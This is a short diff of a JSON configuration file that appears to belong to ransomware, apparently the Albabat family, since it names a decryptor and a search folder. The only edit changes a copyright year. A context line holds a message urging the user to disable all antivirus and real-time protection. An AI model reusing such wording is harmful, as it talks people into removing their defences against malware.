@@ -148,7 +148,7 @@
 		},
 		"decryptor_name": "Decryptor",
 		"search_folder": "Search_Albabat",
-    "copyright": "Copyright (c) 2023-2024"
+    "copyright": "Copyright (c) 2023-2025"
   },
   "messages": {
     "fail": "It appears that your antivirus is blocking the process. Disable all your antivirus, real-time protection and file and folder protection functions.",
